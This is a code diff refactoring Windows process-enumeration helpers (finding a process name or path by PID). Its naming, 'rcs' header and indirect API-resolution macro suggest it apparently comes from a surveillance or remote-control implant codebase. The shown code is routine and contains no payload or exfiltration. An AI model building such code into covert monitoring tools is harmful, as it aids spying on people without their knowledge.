@@ -1,125 +1,9 @@
 #include <Windows.h>
+#include <TlHelp32.h>
 #include <strsafe.h>
+#include <rcs/enumprocess.h>
 #include "common.h"
 #include "process.h"
-
-struct EnumerateProcess
-{
-	HANDLE hHandle;
-	PROCESSENTRY32 pe32;
-
-	EnumerateProcess()
-		: hHandle(NULL)
-	{
-	}
-
-	~EnumerateProcess()
-	{
-		if (hHandle != INVALID_HANDLE_VALUE && hHandle != NULL) {
-			CloseHandle(hHandle);
-			hHandle = NULL;
-		}
-	}
-
-	BOOL fetch() {
-		if (hHandle == NULL) {
-			memset(&pe32, 0, sizeof(PROCESSENTRY32));
-			pe32.dwSize = sizeof(PROCESSENTRY32);
-			hHandle = FNC(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
-
-			if (!FNC(Process32First)(hHandle, &pe32)) {
-				CloseHandle(hHandle);
-				hHandle = INVALID_HANDLE_VALUE;
-				return FALSE;
-			}
-			return TRUE;
-		}
-		else if (hHandle == INVALID_HANDLE_VALUE) {
-		}
-		else {
-			if (FNC(Process32Next)(hHandle, &pe32) == FALSE) {
-				CloseHandle(hHandle);
-			}
-		}
-
-		if (hHandle == INVALID_HANDLE_VALUE || hHandle == NULL)
-			return FALSE;
-
-		return TRUE;
-	}
-
-	bool operator() () {
-		if (fetch() == FALSE)
-			return false;
-
-		return true;
-	}
-
-};
-
-struct EnumerateProcessW
-{
-	HANDLE hHandle;
-	PROCESSENTRY32W pe32;
-
-	EnumerateProcessW()
-		: hHandle(NULL)
-	{
-	}
-
-	~EnumerateProcessW()
-	{
-		if (hHandle != INVALID_HANDLE_VALUE && hHandle != NULL) {
-			CloseHandle(hHandle);
-			hHandle = NULL;
-		}
-	}
-
-	BOOL fetch() {
-		if (hHandle == NULL) {
-			memset(&pe32, 0, sizeof(PROCESSENTRY32W));
-			pe32.dwSize = sizeof(PROCESSENTRY32W);
-			hHandle = FNC(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
-
-			if (!FNC(Process32FirstW)(hHandle, &pe32)) {
-				CloseHandle(hHandle);
-				hHandle = INVALID_HANDLE_VALUE;
-				return FALSE;
-			}
-			return TRUE;
-		}
-		else if (hHandle == INVALID_HANDLE_VALUE) {
-		}
-		else {
-			if (FNC(Process32NextW)(hHandle, &pe32) == FALSE) {
-				CloseHandle(hHandle);
-			}
-		}
-
-		if (hHandle == INVALID_HANDLE_VALUE || hHandle == NULL)
-			return FALSE;
-
-		return TRUE;
-	}
-
-	bool find(DWORD dwPid) {
-		while (fetch()) {
-			if (pe32.th32ProcessID == dwPid)
-				return true;
-		}
-
-		return false;
-	}
-
-	bool operator() () {
-		if (fetch() == FALSE)
-			return false;
-
-		return true;
-	}
-
-
-};
 
 typedef struct {
 	HWND proc_window;
@@ -167,17 +51,17 @@ char* HM_FindProc(DWORD pid)
 
 	// Cicla la lista dei processi attivi
 	while (processes()) {
-		if (processes.pe32.th32ProcessID == pid) {
-			// Elimina il path
-			name_offs = strrchr(processes.pe32.szExeFile, '\\');
+		PROCESSENTRY32* pe32 = *processes;
+
+		if (pe32->th32ProcessID == pid) {
+			name_offs = strrchr(pe32->szExeFile, '\\');
 			if (!name_offs)
-				name_offs = processes.pe32.szExeFile;
+				name_offs = pe32->szExeFile;
 			else
 				name_offs++;
 			ret_name = _strdup(name_offs);
 			break;
 		}
-
 	}
 
 	return ret_name;
@@ -196,9 +80,11 @@ WCHAR* HM_FindProcW(DWORD pid)
 
 	while (proc.find(pid)) {
 		// Elimina il path
-		name_offs = wcsrchr(proc.pe32.szExeFile, L'\\');
+		PROCESSENTRY32W* pe32 = *proc;
+
+		name_offs = wcsrchr(pe32->szExeFile, L'\\');
 		if (!name_offs)
-			name_offs = proc.pe32.szExeFile;
+			name_offs = pe32->szExeFile;
 		else
 			name_offs++;
 		ret_name = _wcsdup(name_offs);
@@ -210,7 +96,7 @@ WCHAR* HM_FindProcW(DWORD pid)
 
 static BOOL HM_FindProcPath(DWORD pid, LPWSTR lpFilename, DWORD len)
 {
-	HANDLE hProc = OpenProcess(0x410, FALSE, pid);
+	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
 	DWORD n = 0;
 
 	if (hProc != NULL) {
